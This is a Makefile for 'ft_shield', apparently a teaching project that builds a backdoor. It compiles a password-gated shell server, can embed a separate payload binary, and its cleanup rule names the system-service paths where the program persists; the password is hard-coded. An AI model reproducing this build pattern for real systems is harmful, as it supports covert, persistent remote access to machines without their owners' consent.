SHELL=/bin/bash

# COLORS #
_RED		=	\e[31m
_GREEN		=	\e[32m
_YELLOW		=	\e[33m
_BLUE		=	\e[34m
_END		=	\e[0m

# COMPILATION #
CC_FLAGS	=	-Wall -Wextra -Werror -fno-builtin

# DIRECTORIES #
DIR_HEADERS		=	./includes/
DIR_SRCS		=	./srcs/
DIR_OBJS		=	./compiled_srcs/

# FILES #
SRCS			=	ft_shield.c \
					server.c \
					shell.c \
					sha256.c

SRCS_PAYLOAD	=	payload.c \
					server.c \
					shell.c \
					sha256.c

INCLUDES		=	ft_shield.h

# COMPILED_SOURCES #
OBJS			=	$(SRCS:%.c=$(DIR_OBJS)%.o)
OBJS_PAYLOAD	=	$(SRCS_PAYLOAD:%.c=$(DIR_OBJS)%.o)
NAME			=	ft_shield

PAYLOAD_NAME	=	payload

PASSWD			=	lmartin
HASHED_PWD		=	echo -n $(PASSWD) | sha256sum | head -c 64

ifeq ($(BUILD),debug)
	CC_FLAGS	+=	-DDEBUG -g3 -fsanitize=address
	DIR_OBJS	=	./debug-compiled_srcs/
	NAME		=	./debug-ft_shield
endif

## RULES ##
all:			$(NAME)

$(PAYLOAD_NAME):	$(OBJS_PAYLOAD) $(addprefix $(DIR_HEADERS), $(INCLUDES))
					@printf "\033[2K\r$(_BLUE) All files compiled into '$(DIR_OBJS)'. $(_END)✅\n"
					@gcc $(CC_FLAGS) -I $(DIR_HEADERS) $(OBJS_PAYLOAD) -o $(PAYLOAD_NAME)
					@printf "\033[2K\r$(_GREEN) Executable '$(PAYLOAD_NAME)' created. $(_END)✅\n"

# VARIABLES RULES #
$(NAME):		$(OBJS) $(addprefix $(DIR_HEADERS), $(INCLUDES))
				@printf "\033[2K\r$(_BLUE) All files compiled into '$(DIR_OBJS)'. $(_END)✅\n"
ifeq (,$(wildcard ./$(PAYLOAD_NAME)))
				@gcc $(CC_FLAGS) -I $(DIR_HEADERS) $(OBJS) -o $(NAME)
				@printf "\033[2K\r$(_GREEN) Executable '$(NAME)' (Version without $(PAYLOAD_NAME)) created. $(_END)✅\n"
else
				@ld -r -b binary -o $(DIR_OBJS)payload.o ./$(PAYLOAD_NAME)
				@gcc $(CC_FLAGS) -I $(DIR_HEADERS) $(OBJS) $(DIR_OBJS)payload.o -o $(NAME)
				@printf "\033[2K\r$(_GREEN) Executable '$(NAME)' (using '$(PAYLOAD_NAME)') created. $(_END)✅\n"
endif
				@printf "\033[2K\r$(_GREEN) Password: '$(PASSWD)'. $(_END)✅\n"

# COMPILED_SOURCES RULES #
$(OBJS):				| $(DIR_OBJS)
$(OBJS_PAYLOAD):		| $(DIR_OBJS)

$(DIR_OBJS)%.o: $(DIR_SRCS)%.c
				@printf "\033[2K\r $(_YELLOW)Compiling $< $(_END)⌛ "
ifeq (,$(wildcard ./payload))
				@gcc $(CC_FLAGS) -I $(DIR_HEADERS) -DHASHED_PWD=\"$(shell $(HASHED_PWD))\" -c $< -o $@
else
				@gcc $(CC_FLAGS) -fPIC -I $(DIR_HEADERS) -DHASHED_PWD=\"$(shell $(HASHED_PWD))\" -DPAYLOAD -c $< -o $@
endif

$(DIR_OBJS):
				@mkdir -p $(DIR_OBJS)

# MANDATORY PART #
clean:
				@rm -rf $(DIR_OBJS)
				@printf "\033[2K\r$(_RED) '"$(DIR_OBJS)"' has been deleted. $(_END)🗑️\n"

fclean:			clean
				@rm -rf $(PAYLOAD_NAME)
				@printf "\033[2K\r$(_RED) '"$(PAYLOAD_NAME)"' has been deleted. $(_END)🗑️\n"
				@rm -rf $(NAME)
				@printf "\033[2K\r$(_RED) '"$(NAME)"' has been deleted. $(_END)🗑️\n"

mrproper:		fclean
				@sudo rm -rf /bin/ft_shield
				@sudo rm -rf /etc/init.d/ft_shield.service
				@sudo rm -rf /etc/systemd/system/ft_shield.service

re:				fclean
				@$(MAKE) $(PAYLOAD_NAME) --no-print-directory
				@$(MAKE) --no-print-directory


# PHONY #

.PHONY:			all clean fclean re
